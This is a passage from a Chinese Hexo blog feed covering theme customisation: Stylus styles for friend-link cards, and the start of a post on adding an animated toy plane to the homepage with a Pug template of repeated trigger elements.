class="number">12px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="built_in">var</span>(--style-border);</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--anzhiyu-card-bg);</span><br><span class="line">    -webkit-<span class="attribute">transition</span>: all .<span class="number">3s</span> ease-in-out;</span><br><span class="line">    -moz-<span class="attribute">transition</span>: all .<span class="number">3s</span> ease-in-out;</span><br><span class="line">    -o-<span class="attribute">transition</span>: all .<span class="number">3s</span> ease-in-out;</span><br><span class="line">    -ms-<span class="attribute">transition</span>: all .<span class="number">3s</span> ease-in-out;</span><br><span class="line">    <span class="attribute">transition</span>: all .<span class="number">3s</span> ease-in-out;</span><br><span class="line"></span><br><span class="line">    +maxWidth1200()</span><br><span class="line">      <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">50%</span> - <span class="number">15px</span>) <span class="meta">!important</span></span><br><span class="line"></span><br><span class="line">    +<span class="built_in">maxWidth600</span>()</span><br><span class="line">      width: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">15px</span>) <span class="meta">!important</span></span><br><span class="line"></span><br><span class="line">    &amp;:hover</span><br><span class="line">      border-color: <span class="built_in">var</span>(--anzhiyu-main)<span class="meta">!important</span>;</span><br><span class="line">      <span class="attribute">background-color</span>: <span class="built_in">var</span>(--anzhiyu-main)<span class="meta">!important</span>;</span><br><span class="line">      <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--anzhiyu-shadow-theme)<span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">      <span class="selector-class">.flink-item-icon</span></span><br><span class="line">        <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">margin-left</span>: -<span class="number">10px</span>;</span><br><span class="line">      <span class="selector-class">.flink-item-name</span>,<span class="selector-class">.flink-item-desc</span></span><br><span class="line">        <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-white);</span><br><span class="line"></span><br><span class="line">    &amp;<span class="selector-pseudo">:hover</span><span class="selector-pseudo">:before</span>,</span><br><span class="line">    &amp;<span class="selector-pseudo">:focus</span><span class="selector-pseudo">:before</span>,</span><br><span class="line">    &amp;<span class="selector-pseudo">:active</span><span class="selector-pseudo">:before</span></span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    a</span><br><span class="line">      color: <span class="built_in">var</span>(--font-color)</span><br><span class="line">      text-decoration: none</span><br><span class="line"></span><br><span class="line">      .flink-item-icon</span><br><span class="line">        float: left</span><br><span class="line">        overflow: hidden</span><br><span class="line">        margin: <span class="number">15px</span> <span class="number">10px</span></span><br><span class="line">        width: <span class="number">60px</span></span><br><span class="line">        height: <span class="number">60px</span></span><br><span class="line">        border-radius: <span class="number">35px</span></span><br><span class="line">        transition: all .<span class="number">3s</span> ease-out</span><br><span class="line">        margin: <span class="number">8px</span> <span class="number">0</span> <span class="number">8px</span> <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-background);</span><br><span class="line">        <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">        <span class="attribute">overflow</span>: hidden;</span><br><span class="line"></span><br><span class="line">        <span class="selector-tag">img</span></span><br><span class="line">          <span class="attribute">width</span>: <span class="number">100%</span></span><br><span class="line">          height: <span class="number">100%</span></span><br><span class="line">          transition: filter <span class="number">375ms</span> ease-in .<span class="number">2s</span>, transform .<span class="number">3s</span></span><br><span class="line">          object-fit: cover</span><br><span class="line"></span><br><span class="line">      .img-alt</span><br><span class="line">        display: none</span><br><span class="line">.flink-item-info</span><br><span class="line">  display: flex;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flink-item-name</span></span><br><span class="line">    <span class="keyword">@extend</span> .limit-one-line</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">12px</span> <span class="number">0</span> <span class="number">16px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: auto;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold</span><br><span class="line">    font-size: <span class="number">1.2em</span></span><br><span class="line">    color: <span class="built_in">var</span>(--anzhiyu-fontcolor);</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flink-item-desc</span></span><br><span class="line">    <span class="keyword">@extend</span> .limit-one-line</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span></span><br><span class="line">    <span class="attribute">height</span>: <span class="number">35px</span></span><br><span class="line">    <span class="attribute">font-size</span>: .<span class="number">93em</span></span><br><span class="line">    <span class="attribute">opacity</span>: .<span class="number">7</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-fontcolor);</span><br><span class="line">    <span class="attribute">word-break</span>: break-all;</span><br><span class="line">    <span class="attribute">white-space</span>: break-spaces;</span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    -webkit-box-orient: vertical;</span><br><span class="line">    -webkit-line-clamp: <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.flink-name</span></span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">5px</span></span><br><span class="line">  font-weight: bold</span><br><span class="line">  font-size: <span class="number">1.5em</span></span><br><span class="line"></span><br><span class="line">#article-container img</span><br><span class="line">  margin-bottom: <span class="number">0.5rem</span>;</span><br><span class="line">  <span class="attribute">object-fit</span>: cover;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">900px</span>;</span><br><span class="line"><span class="selector-class">.flexcard-flink-list</span></span><br><span class="line">  <span class="attribute">overflow</span> hidden</span><br><span class="line">  <span class="selector-class">.flink-list-card</span></span><br><span class="line">    <span class="selector-class">.wrapper</span> <span class="selector-tag">img</span></span><br><span class="line">      <span class="attribute">transition</span>: transform .<span class="number">5s</span> ease-out <span class="meta">!important</span>;</span><br><span class="line">    &amp;<span class="selector-pseudo">:hover</span></span><br><span class="line">      <span class="attribute">border-color</span>: <span class="built_in">var</span>(--anzhiyu-main)<span class="meta">!important</span>;</span><br><span class="line">      <span class="attribute">background-color</span>: <span class="built_in">var</span>(--anzhiyu-main)<span class="meta">!important</span>;</span><br><span class="line">      <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--anzhiyu-shadow-theme)<span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">  &amp; &gt; <span class="selector-tag">a</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> / <span class="number">5</span> - <span class="number">0.5rem</span>);</span><br><span class="line">    <span class="attribute">height</span> <span class="number">150px</span></span><br><span class="line">    <span class="attribute">position</span> relative</span><br><span class="line">    <span class="attribute">display</span> block</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0.5rem</span> <span class="number">0.25rem</span>;</span><br><span class="line">    <span class="attribute">float</span> <span class="attribute">left</span></span><br><span class="line">    <span class="attribute">overflow</span> hidden</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">transition</span> <span class="attribute">all</span> .<span class="number">3s</span> ease <span class="number">0s</span>, <span class="attribute">transform</span> .<span class="number">6s</span> cubic-bezier(.<span class="number">6</span>, .<span class="number">2</span>, .<span class="number">1</span>, <span class="number">1</span>) <span class="number">0s</span></span><br><span class="line">    <span class="attribute">box-shadow</span> <span class="attribute">none</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="built_in">var</span>(--style-border)<span class="meta">!important</span>;</span><br><span class="line">    &amp;<span class="selector-pseudo">:hover</span></span><br><span class="line">      <span class="selector-class">.info</span></span><br><span class="line">        <span class="attribute">transform</span> translateY(-<span class="number">100%</span>)</span><br><span class="line">      <span class="selector-class">.wrapper</span></span><br><span class="line">        <span class="selector-tag">img</span></span><br><span class="line">          <span class="attribute">transform</span> scale(<span class="number">1.2</span>)</span><br><span class="line">      &amp;<span class="selector-pseudo">::before</span></span><br><span class="line">        <span class="attribute">position</span>: fixed</span><br><span class="line">        width:inherit</span><br><span class="line">        margin:auto</span><br><span class="line">        left:<span class="number">0</span></span><br><span class="line">        right:<span class="number">0</span></span><br><span class="line">        top:<span class="number">10%</span></span><br><span class="line">        border-radius: <span class="number">10px</span></span><br><span class="line">        text-align: center</span><br><span class="line">        z-index: <span class="number">100</span></span><br><span class="line">        content: <span class="built_in">attr</span>(data-title)</span><br><span class="line">        font-size: <span class="number">20px</span></span><br><span class="line">        color: <span class="number">#fff</span></span><br><span class="line">        padding: <span class="number">10px</span></span><br><span class="line">        background-color: <span class="built_in">rgba</span>($theme-color,<span class="number">0.8</span>)</span><br><span class="line"></span><br><span class="line">    .cover</span><br><span class="line">      width <span class="number">100%</span></span><br><span class="line">      transition transform .<span class="number">5s</span> ease-out</span><br><span class="line">    .wrapper</span><br><span class="line">      position relative</span><br><span class="line">      .fadeIn</span><br><span class="line">        animation coverIn .<span class="number">8s</span> ease-out forwards</span><br><span class="line">      img</span><br><span class="line">        height <span class="number">150px</span></span><br><span class="line">        pointer-events none</span><br><span class="line">    .info</span><br><span class="line">      display flex</span><br><span class="line">      flex-direction column</span><br><span class="line">      justify-content center</span><br><span class="line">      align-items center</span><br><span class="line">      width <span class="number">100%</span></span><br><span class="line">      height <span class="number">100%</span></span><br><span class="line">      pointer-events: none;</span><br><span class="line">      <span class="attribute">overflow</span> hidden</span><br><span class="line">      <span class="attribute">border-radius</span> <span class="number">3px</span></span><br><span class="line">      <span class="attribute">background-color</span> hsla(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">100%</span>, .<span class="number">7</span>)</span><br><span class="line">      <span class="attribute">transition</span> <span class="attribute">transform</span> .<span class="number">5s</span> cubic-bezier(.<span class="number">6</span>, .<span class="number">2</span>, .<span class="number">1</span>, <span class="number">1</span>) <span class="number">0s</span></span><br><span class="line">      <span class="selector-tag">img</span></span><br><span class="line">        <span class="attribute">position</span> relative</span><br><span class="line">        <span class="attribute">top</span> <span class="number">45px</span></span><br><span class="line">        <span class="attribute">width</span> <span class="number">80px</span></span><br><span class="line">        <span class="attribute">height</span> <span class="number">80px</span></span><br><span class="line">        <span class="attribute">border-radius</span> <span class="number">50%</span></span><br><span class="line">        <span class="attribute">box-shadow</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">3</span>)</span><br><span class="line">        <span class="attribute">z-index</span> <span class="number">1</span></span><br><span class="line">        <span class="attribute">text-align</span> center</span><br><span class="line">        <span class="attribute">pointer-events</span> <span class="attribute">none</span></span><br><span class="line">      <span class="selector-tag">span</span></span><br><span class="line">        <span class="attribute">padding</span> <span class="number">20px</span> <span class="number">10%</span> <span class="number">60px</span> <span class="number">10%</span></span><br><span class="line">        <span class="attribute">font-size</span> <span class="number">16px</span></span><br><span class="line">        <span class="attribute">width</span> <span class="number">100%</span></span><br><span class="line">        <span class="attribute">text-align</span> center</span><br><span class="line">        <span class="attribute">box-shadow</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">3</span>)</span><br><span class="line">        <span class="attribute">background-color</span> hsla(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">100%</span>, .<span class="number">7</span>)</span><br><span class="line">        <span class="attribute">color</span> <span class="selector-tag">var</span>(<span class="attr">--font-color</span>)</span><br><span class="line">        <span class="attribute">white-space</span> nowrap</span><br><span class="line">        <span class="attribute">overflow</span> hidden</span><br><span class="line">        <span class="attribute">text-overflow</span> ellipsis</span><br><span class="line"><span class="selector-class">.flexcard-flink-list</span>&gt;<span class="selector-tag">a</span> <span class="selector-class">.info</span>,</span><br><span class="line"><span class="selector-class">.flexcard-flink-list</span>&gt;<span class="selector-tag">a</span> <span class="selector-class">.wrapper</span> <span class="selector-class">.cover</span></span><br><span class="line">  <span class="attribute">position</span> absolute</span><br><span class="line">  <span class="attribute">top</span> <span class="number">0</span></span><br><span class="line">  <span class="attribute">left</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>:<span class="number">1024px</span>)</span><br><span class="line">  .flexcard-flink-list</span><br><span class="line">    &amp; &gt; a</span><br><span class="line">      <span class="attribute">width</span> calc(<span class="number">33.33333%</span> - <span class="number">15px</span>)</span><br><span class="line"></span><br><span class="line">@media screen <span class="keyword">and</span> (<span class="attribute">max-width</span>:<span class="number">600px</span>)</span><br><span class="line">  .flexcard-flink-list</span><br><span class="line">    &amp; &gt; a</span><br><span class="line">      <span class="attribute">width</span> calc(<span class="number">50%</span> - <span class="number">15px</span>)</span><br><span class="line"></span><br><span class="line">[data-theme=dark]</span><br><span class="line">  .flexcard-flink-list a .info,</span><br><span class="line">  .flexcard-flink-list a .info span</span><br><span class="line">    background-color rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">6</span>)</span><br><span class="line">  .flexcard-flink-list</span><br><span class="line">    &amp; &gt; a</span><br><span class="line">      &amp;:<span class="attribute">hover</span></span><br><span class="line">        &amp;:before</span><br><span class="line">          <span class="attribute">background-color</span>: rgba(#<span class="number">121212</span>,<span class="number">0.8</span>);</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">div</span> &gt; <span class="selector-tag">img</span>,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">figure</span> &gt; <span class="selector-tag">img</span>,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">a</span> &gt; <span class="selector-tag">a</span> &gt; <span class="selector-tag">img</span>,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">div</span> &gt; <span class="selector-tag">a</span> &gt; <span class="selector-tag">img</span>,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">figure</span> &gt; <span class="selector-tag">a</span> &gt; <span class="selector-tag">img</span>,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">a</span> &gt; svg,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">div</span> &gt; svg,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">figure</span> &gt; svg,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">a</span> &gt; <span class="selector-tag">a</span> &gt; svg,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">div</span> &gt; <span class="selector-tag">a</span> &gt; svg,</span><br><span class="line"><span class="selector-class">.justified-gallery</span> &gt; <span class="selector-tag">figure</span> &gt; <span class="selector-tag">a</span> &gt; svg</span><br><span class="line">  <span class="attribute">position</span> static!important</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>首页添加玩具飞机</title>
      <link href="/post/d7ec8f29.html"/>
      <url>/post/d7ec8f29.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://fe32.top/articles/hexo1615/#%E6%8E%A8%E8%8D%90%E9%98%85%E8%AF%BB">飞只因太美，给你的首页装上吧！</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/01/p9znMiF.png" alt=""></p>              </div>            </details><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>在<code>BlogRoot/themes/butterfly/layout/includes/header</code>文件夹下新建一个<code>plane.pug</code>文件<br>具体位置如下图：</p><p><img src="https://bu.dusays.com/2022/11/06/63675e2333399.jpg" alt="img"></p><p>将以下代码复制到文件中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br></pre></td><td class="code"><pre><span class="line">#drone</span><br><span class="line">  .container</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span 